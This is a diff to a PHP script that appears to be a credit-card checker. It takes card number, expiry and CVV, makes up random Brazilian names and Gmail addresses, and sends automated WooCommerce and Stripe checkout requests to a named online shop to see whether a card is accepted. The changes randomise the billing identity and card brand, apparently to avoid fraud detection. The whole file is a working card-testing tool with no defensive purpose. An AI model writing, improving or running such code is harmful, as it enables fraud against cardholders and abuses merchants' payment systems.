@@ -14,11 +14,21 @@ function getStr($string, $start, $end) {
     return $str[0];
 }
 
-function GenerateEmails(){
+function GenerateUsers(){
     $rand = rand(10, 10000000000);
     $names = ['haika', 'kelly', 'jessica', 'lucas', 'joao', 'maria', 'pedro', 'ana', 'carlos', 'julia', 'fernanda', 'gabriel', 'isabela', 'henrique', 'lara', 'matheus', 'natalia', 'olivia', 'pedro', 'queiroz', 'rebecca', 'samuel', 'thais', 'vinicius', 'yasmin', 'zoe'];
+    $sub_names = ['silva', 'franco', 'santos', 'oliveira', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira'];
     $name = $names[rand(0, count($names) - 1)];
-    return $name.$rand.'@gmail.com';
+    $sub_name = $sub_names[rand(0, count($sub_names) - 1)];
+    $name_full = "$name$sub_name";
+    $email = $name.$rand.'@gmail.com';
+
+    return [
+        'email' => $email,
+        'name_full' => $name_full,
+        'name' => $name,
+        'sub_name' => $sub_name
+    ];
 }
 
 if(empty($cc) || empty($mes) || empty($ano) || empty($cvv)){
@@ -32,7 +42,7 @@ if(empty($cc) || empty($mes) || empty($ano) || empty($cvv)){
     exit();
 }
 
-$email = GenerateEmails();
+$users = GenerateUsers();
 $cookiecount = "woo_".rand(10, 10000000000)."";
 
 $c = curl_init();
@@ -86,6 +96,10 @@ curl_setopt($c, CURLOPT_HTTPHEADER, array(
 ));
 $checkout = curl_exec($c);
 
+$email = $users['email'];
+$nome = $users['name'];
+$sub_nome = $users['sub_name'];
+
 $nonce = getStr($checkout, 'name="woocommerce-process-checkout-nonce" value="','"');
 
 $c = curl_init();
@@ -127,7 +141,7 @@ curl_setopt($c, CURLOPT_HTTPHEADER, array(
 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' ,
 'x-requested-with: XMLHttpRequest'
 ));
-curl_setopt($c, CURLOPT_POSTFIELDS, 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fsmoothitalia.com%2Fcategoria-prodotto%2Fcarhartt-wip-shop-online%2Fpage%2F33%2F&wc_order_attribution_session_start_time=2025-01-13+22%3A16%3A19&wc_order_attribution_session_pages=13&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F131.0.0.0+Safari%2F537.36+Edg%2F131.0.0.0&billing_first_name=Stealer&billing_last_name=asdasdasd&billing_company=xzcasdasd&billing_country=BR&billing_address_1=12&billing_address_2=cxc&billing_city=sdasd&billing_state=AC&billing_postcode=01451-001&billing_phone=%2B5519998128237&billing_email='.urlencode($email).'&account_username=&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=BR&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=betrs_shipping%3A8-1&payment_method=eh_stripe_pay&paypal_credit_card_rest-card-number=&paypal_credit_card_rest-card-expiry=&paypal_credit_card_rest-card-cvc=&terms=on&terms-field=1&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&eh_stripe_pay_amount=2900&eh_stripe_pay_token='.$id.'&eh_stripe_pay_currency=eur&eh_stripe_pay_amount=7890&eh_stripe_card_type=mastercard');
+curl_setopt($c, CURLOPT_POSTFIELDS, 'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fsmoothitalia.com%2Fcategoria-prodotto%2Fcarhartt-wip-shop-online%2Fpage%2F33%2F&wc_order_attribution_session_start_time=2025-01-13+22%3A16%3A19&wc_order_attribution_session_pages=13&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F131.0.0.0+Safari%2F537.36+Edg%2F131.0.0.0&billing_first_name='.$nome.'&billing_last_name='.$sub_nome.'&billing_company=xzcasdasd&billing_country=BR&billing_address_1=12&billing_address_2=cxc&billing_city=sdasd&billing_state=AC&billing_postcode=01451-001&billing_phone=%2B5519998128237&billing_email='.urlencode($email).'&account_username=&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=BR&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=betrs_shipping%3A8-1&payment_method=eh_stripe_pay&paypal_credit_card_rest-card-number=&paypal_credit_card_rest-card-expiry=&paypal_credit_card_rest-card-cvc=&terms=on&terms-field=1&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&eh_stripe_pay_amount=2900&eh_stripe_pay_token='.$id.'&eh_stripe_pay_currency=eur&eh_stripe_pay_amount=7890&eh_stripe_card_type='.$brand.'');
 $f = curl_exec($c);
 
 if (stripos($f, 'redirect')){
